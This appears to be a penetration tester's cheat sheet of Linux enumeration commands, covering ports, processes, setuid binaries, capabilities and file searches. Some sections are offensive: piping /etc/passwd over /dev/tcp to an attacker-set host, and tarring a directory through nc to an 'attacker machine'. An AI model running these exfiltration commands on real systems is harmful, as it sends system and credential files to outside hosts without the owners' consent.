# linux enumeration quick commands

## list all recursively with ls sorting by modification date within directories
```bash
ls -alRt
```

## enumerate open ports if `ss` is not present
```bash
netstat -tunlp
```

## process tree ps
```bash
ps -auxwf
ps -efw --forest
ps -efw --forest -M                  # SELinux
```

## find setuid binaries
```bash
find / -perm -4000 -ls 2>/dev/null
```

## find files belonging to user
```bash
find / -user username 2>/dev/null
```

## find files belonging to group
```bash
find / -group adm 2>/dev/null
```

## find files modified between specific dates
```bash
find / -type f -newermt "2022-02-20" -not -newermt "2022-02-28" 2>/dev/null
```

## find files modified between specific dates (with reference files)
```bash
touch --date "2007-01-01" /tmp/start
touch --date "2008-01-01" /tmp/end
find /data/images -type f -newer /tmp/start -not -newer /tmp/end 2>/dev/null
```

## get all file hashes in directory using find and md5sum
```bash
find . -exec md5sum {} \;
```

## get number of CPU processors
```bash
cat /proc/cpuinfo | grep processor | wc -l
```

## find all git repositories
```bash
find / -name .git 2>/dev/null
```

## get IP with no `ifconfig` or `ip a` on a host or within docker container
```bash
hostname -I
```
    -i, --ip-address       addresses for the host name
    -I, --all-ip-addresses all addresses for the host

## transfer / download files with just bash
### receive
```bash
LHOST=1.2.3.4
LPORT=443
bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
```
### send
```bash
LPORT=443
nc -lvnp $LPORT < filename
```

## exfiltrate files bash pipe tcp
```bash
cat /etc/passwd > /dev/tcp/$LHOST/$LPORT
bash -c "cat /etc/passwd > /dev/tcp/$LHOST/$LPORT"
```

## find files that have millisecond microsecond nanosecond times not common install
files from package managers usually have all 0 for microsecond time in the file system, so files with microsecond times were touched by programs.
full iso time can be sorted alphabetically, so pipe to sort to sort the results.
```bash
find /etc/ -type f -printf "%T+ %p\n" 2>/dev/null | grep -v 0000000000
find /etc/ -type f -printf "%T+ %p\n" 2>/dev/null | grep -v 0000000000 | sort
```

## copy entire directory to attacker machine quickly by piping tar
attacker
```bash
# attacker
nc -lvnp 1337 | tar -xf -
# target
tar -cf - . | nc $LHOST 1337
```

## capabilities

### get capabilities of all files recursively
```bash
getcap -r / 2>/dev/null
```

### without getcap binary
```bash
cat /proc/self/status | grep Cap
cat /proc/$pid/status | grep CapEff
```

### running process effective capabilities
```bash
cat /proc/*/status | awk '/CapEff/ && $2 !~ /^0*$/ { print name, pid, uid, $2 } /^Pid/ { pid = $2 } /^Uid/ { uid = $2 } /^Name/ { name = $2 }'
```

### decode on host machine with capsh
```bash
capsh --decode=000001ffffffffff
```

## list systemd timers
```bash
systemctl list-timers
```

## check if users can see other users' processes
the proc pseudo file system will be mounted with `hidepid=2`.
the `gid` option specifies a group id that can read all processes.
```bash
mount | grep hidepid
```

## file transfer with cat herefiles
```bash
cat << EOF >> filename.sh
# paste file contents here
EOF
```

# get facl recursively centos / redhat
```bash
getfacl -R -s .
getfacl -R -s /
```

# get all root process IDs
```bash
ps -ef | awk '/^root/ && !/\]$/ { print $2 }'
```
